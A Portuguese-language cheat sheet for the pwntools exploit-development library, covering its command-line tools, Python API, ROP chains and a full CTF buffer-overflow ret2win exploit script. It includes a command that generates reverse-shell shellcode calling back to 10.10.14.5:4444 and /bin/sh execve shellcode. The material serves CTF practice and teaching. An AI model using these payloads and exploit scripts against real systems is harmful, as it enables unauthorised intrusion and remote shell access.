<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# folha de dicas do pwntools

[pwntools](https://github.com/Gallopsled/pwntools) é a melhor estrutura CTF e biblioteca de desenvolvimento de exploits escrita em Python. Projetado para prototipagem rápida, exploração binária (pwn) e engenharia reversa, ele fornece um conjunto abrangente de ferramentas de linha de comando (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) junto com uma API Python de alto nível para interagir com processos locais e soquetes remotos.

---

## Índice

- [Capacidades principais](#capacidades principais)
- [Instalação](#instalação)
- [Utilitários de linha de comando (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (cálculo de deslocamento de buffer)](#pwn-cíclico-buffer-offset-cálculo)
  - [`pwn checksec` (inspeção de mitigação)](#pwn-checksec-mitigação-inspeção)
  - [`pwn asm` e `pwn disasm` (Montador/Desmontador)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (Gerador de Shellcode)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (gerador de esqueleto de exploração)](#pwn-template-exploit-skeleton-generator)
- [Fluxo de trabalho de desenvolvimento de exploração Python](#python-exploit-development-workflow)
  - [Conexões de processo e soquete remoto](#process--remote-socket-connections)
  - [Análise ELF e Símbolos](#elf-parsing--symbols)
  - [Construção da Cadeia ROP](#rop-chain-construction)
  - [Embalagem e Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Exemplo completo de exploração (Buffer Overflow + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Capacidades principais

- **Arquitetura Tubes:** Interface unificada para interação com processos locais (`process`), soquetes TCP remotos (`remote`) e sessões SSH (`ssh`).
- **Inspeção binária e de gadgets:** Resolução automatizada de símbolos ELF, pesquisa GOT/PLT e síntese automatizada de cadeia ROP.
- **Montagem instantânea:** Tradução instantânea entre mnemônicos de montagem e códigos de operação em x86, x86_64, ARM, MIPS e AArch64.
- **Síntese de Shellcode:** Modelos de shellcode pré-construídos e personalizáveis ​​para shells reversos, execve, leitura de arquivos e evasão.

---

## Instalação
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Utilitários de linha de comando (`pwn <cmd>`)

### `pwn cyclic` (cálculo de compensação de buffer)
Gere padrões cíclicos De Bruijn exclusivos para determinar o deslocamento exato da falha (sobregravação EIP/RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Inspeção de Mitigação)
Verifique as mitigações de segurança (Canary, NX, PIE, RELRO, ASLR) de qualquer executável ELF:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` e `pwn disasm` (Montador/Desmontador)
Monte instruções em bytes de shellcode diretamente do terminal:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Gerador de Shellcode)
Gere cargas úteis de shellcode prontas para produção diretamente no terminal stdout ou em arquivos binários:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (gerador de esqueleto de exploração)
Gere um modelo de exploração Python testado em batalha para um servidor remoto e binário de destino:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Fluxo de trabalho de desenvolvimento de exploração em Python

### Processo e conexões de soquete remoto
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### Análise e símbolos ELF
Leia automaticamente endereços de função, tabelas GOT e PLT sem pesquisas manuais no GDB:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Construção de corrente ROP
Crie cadeias de Programação Orientada a Retorno (ROP) automaticamente:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Embalagem e Endianidade (`p32` / `p64`)
Converta endereços de memória inteiros em bytes little-endian:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Exemplo completo de exploração (Buffer Overflow + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```